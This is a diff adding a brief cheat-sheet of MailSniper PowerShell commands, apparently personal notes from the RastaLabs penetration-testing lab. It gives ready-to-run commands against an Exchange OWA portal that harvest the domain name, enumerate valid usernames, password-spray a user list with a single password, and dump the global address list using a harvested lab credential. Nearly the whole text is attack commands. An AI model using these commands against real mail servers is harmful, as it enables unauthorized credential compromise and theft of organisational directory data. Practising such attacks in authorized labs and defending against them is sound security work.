@@ -1,0 +1,30 @@
+MAIL SNIPER
+This will gather the domain name - Keep in mind, you may want to run this twice to verify results
+
+Invoke-DomainHarvestOWA -ExchHostname <ip or url> -DomainList <domain list file> -Outfile <output file>
+
+Invoke-DomainHarvestOWA -ExchHostname "10.10.110.254" -DomainList .\domains.txt -brute  <----this is rastalabs
+
+
+
+
+This will check for valid domain users on the Domain after you gather a pre-generated username list
+
+Invoke-UsernameHarvestOWA -ExchHostname "10.10.110.254" -UserList .\email_addys.txt -Domain rastalabs.local
+
+
+
+This will spray the OWA portal against a valid userlist with a singular password
+
+Invoke-PasswordSprayOWA -ExchHostname "10.10.110.254" -Domain rastalabs.local -UserList .\email_addys.txt -Password Labrador1
+
+
+
+
+
+This will use a harvested credential to get a global-address list
+
+Get-GlobalAddressList -ExchHostname "10.10.110.254" -UserName rastalabs.local\ahope -Password Spring2017 -OutFile test.txt
+
+
+
